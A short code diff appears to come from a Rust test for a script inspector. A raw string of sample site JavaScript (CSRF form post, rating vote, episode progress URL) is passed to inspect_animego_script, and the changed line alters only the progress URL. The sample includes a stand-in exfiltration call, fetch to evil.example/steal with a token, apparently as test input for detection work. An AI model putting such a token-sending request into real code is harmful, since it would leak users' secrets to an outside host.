@@ -150,7 +150,7 @@ mod tests {
             body: new URLSearchParams({ token: csrf, status: listType, progress: watched })
           });
           axios.post('/rating/anime/' + id + '/vote', { rate: score });
-          const progressUrl = \`/episode/progress/update\`;
+          const progressUrl = `/episode/${episodeId}/progress`;
           fetch('https://evil.example/steal?token=secret');
         "#;
         let found = inspect_animego_script(source);
